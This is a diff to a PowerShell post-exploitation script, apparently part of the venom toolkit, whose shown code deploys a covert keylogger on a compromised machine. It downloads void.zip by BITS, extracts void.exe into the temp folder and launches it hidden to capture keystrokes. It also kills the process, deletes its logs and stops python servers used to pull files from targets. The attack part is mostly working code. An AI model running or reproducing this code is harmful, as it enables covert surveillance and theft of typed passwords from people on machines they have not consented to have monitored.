@@ -73,14 +73,14 @@
 .EXAMPLE
    PS C:\> .\webserver.ps1 -Keylogger Start
    Download/Execute void.exe in child process
-   to be abble to capture system keystrokes.
+   to be abble to capture remote host keystrokes.
 
 .EXAMPLE
    PS C:\> .\webserver.ps1 -Keylogger Stop
    Stop keylogger by is process FileName identifier
-   and delete keylogger and all respective files/logs.
+   and  delete keylogger and all respective files/logs
    This parameter can NOT be used together with other parameters
-   because after completing is task (Stop keylogger) it exits.
+   because after completing is task (Stop keylogger proc) it exits.
 
 .EXAMPLE
    PS C:\> .\webserver.ps1 -SEnum True
@@ -123,7 +123,6 @@
     https://github.com/r00t-3xp10it/venom/wiki/CmdLine-&-Scripts-for-reverse-TCP-shell-addicts
     https://github.com/r00t-3xp10it/venom/wiki/cmdlet-to-download-files-from-compromised-target-machine
 #>
-
 
 ## Non-Positional cmdlet named parameters
 [CmdletBinding(PositionalBinding=$false)] param(
@@ -215,10 +214,11 @@ If($SRec -ne '0' -or $SPsr -ne '0' -or $SEnum -ne 'False' -or $Sessions -ne 'Fal
       Write-Host "";Start-Sleep -Seconds 1;exit ## exit @webserver  
    }
 
-   If(-not($FileName -iMatch '.exe')){## This test does not work on binary files (.exe)
+   ## Make sure that the download file its not a 'DOCTYPE html' document
+   If(-not($FileName -iMatch '[.exe]$')){## This test does not work on binary files (.exe)
       $Status = Get-Content -Path "$Initial_Path\$FileName"
-      If($Status -iMatch '<!DOCTYPE html'){## Make sure that the download file its not a 'DOCTYPE html' document
-         Start-Sleep -Seconds 1;Write-Host "[abort] $FileName download corrupted (DOCTYPE html)" -ForeGroundColor Red -BackGroundColor Black
+      If($Status -iMatch '^(<!DOCTYPE html)' -or $Status -iMatch '^(404)'){
+         Write-Host "[abort] $FileName download corrupted (DOCTYPE html)" -ForeGroundColor Red -BackGroundColor Black
          Write-Host "";Start-Sleep -Seconds 1;exit ## exit @webserver
       }
    }
@@ -260,8 +260,7 @@ If($SForce -ne '0' -or $SRec -ne '0' -or $SPsr -ne '0' -or $SEnum -ne 'False' -o
       Start-Sleep -Seconds $SKill; # Kill remote python process after 'xx' seconds delay
       taskkill /F /IM python.exe|Out-Null
       If(-not($LASTEXITCODE -eq 0)){
-         write-host "$LASTEXITCODE   fail to terminate python process(s)" -ForeGroundColor Red -BackgroundColor Black
-      }
+         write-host "$LASTEXITCODE   fail to terminate python process(s)" -ForeGroundColor Red -BackgroundColor Black}
    }Else{
       write-host "$LASTEXITCODE   None active sessions found under $Server_hostName" -ForeGroundColor Red -BackgroundColor Black
    }
@@ -449,24 +448,25 @@ $Timer = Get-Date -Format 'HH:mm:ss'
          If(-not(Test-Path -Path "$Env:TMP\void.zip") -or $SizeDump -lt 36){## Fail to download void.zip using BitsTransfer (BITS)
             Write-Host "[fail] to download void.zip using BitsTransfer service" -ForeGroundColor Red -BackgroundColor Black
             If(Test-Path -Path "$Env:TMP\void.zip" -EA SilentlyContinue){Remove-Item -Path "$Env:TMP\void.zip" -Force}
-            Start-Sleep -Milliseconds 600;Write-Host "[abort] keylogger remote execution .." -ForeGroundColor Yellow
+            Start-Sleep -Milliseconds 600;Write-Host "[abort] keylogger (void.exe) remote execution .." -ForeGroundColor Yellow
             Start-Sleep -Seconds 1;write-host ""       
          }
       }
 
       $SizeDump = ((Get-Item "$Env:TMP\void.zip" -EA SilentlyContinue).length/1KB)
       $KeyPath = Test-Path -Path "$Env:TMP\void.zip" -EA SilentlyContinue
-      If($KeyPath -ieq "True" -and $SizeDump -gt 36){
-         $KeyLoggerTimer = Get-Date -Format 'HH:mm:ss'
+      If($KeyPath -ieq "True" -and $SizeDump -gt 36){## Check for file integrity
+
          ## De-Compress Keylogger Archive files into $env:TMP remote directory
          Expand-Archive -Path "$Env:TMP\void.zip" -DestinationPath "$Env:TMP\void" -Force -ErrorAction SilentlyContinue|Out-Null
          Move-Item $Env:TMP\void\void.exe $Env:TMP\void.exe -Force -EA SilentlyContinue
          Remove-Item -Path "$Env:TMP\void" -Force -Recurse -EA SilentlyContinue
          Remove-Item -Path "$Env:TMP\void.zip" -Force
 
-         ## Start void.exe (keylogger) in an orphan (child) process
+         ## Start void.exe in an orphan process
+         $KeyLoggerTimer = Get-Date -Format 'HH:mm:ss'
          Start-Process -WindowStyle hidden -FilePath "$Env:TMP\void.exe" -ErrorAction SilentlyContinue|Out-Null
-         Start-Sleep -Seconds 2;$PIDS = Get-Process void -ErrorAction SilentlyContinue|Select-Object -ExpandProperty Id|Select -Last 1
+         Start-Sleep -Milliseconds 2600;$PIDS = Get-Process void -ErrorAction SilentlyContinue|Select-Object -ExpandProperty Id|Select -Last 1
 
             ## Create Data Table for output
             $mytable = New-Object System.Data.DataTable
@@ -494,15 +494,16 @@ $Timer = Get-Date -Format 'HH:mm:ss'
       $IDS = Get-Process void -ErrorAction SilentlyContinue|Select-Object -ExpandProperty Id|Select -Last 1
 
       If($IDS){## keylogger process found
-         cmd /c taskkill /F /IM void.exe|Out-Null
+         taskkill /F /IM void.exe|Out-Null
          If($? -ieq 'True'){## Check Last Command ErrorCode (LASTEXITCODE)
-            write-host "Keylogger PID $IDS process successfuly stoped." -ForeGroundColor Green
+            write-host "Keylogger PID $IDS process successfuly stoped.`n" -ForeGroundColor Green
          }Else{
             write-host "[fail] to terminate keylogger PID process" -ForeGroundColor Red -BackgroundColor Black
          }
       }Else{
-         write-host "[fail] keylogger process not found" -ForeGroundColor Red -BackgroundColor Black
+         write-host "[fail] keylogger process PID not found" -ForeGroundColor Red -BackgroundColor Black
       }
+
       write-host ""
       ## Clean old files
       Remove-Item -Path "$Env:TMP\void.log" -EA SilentlyContinue -Force
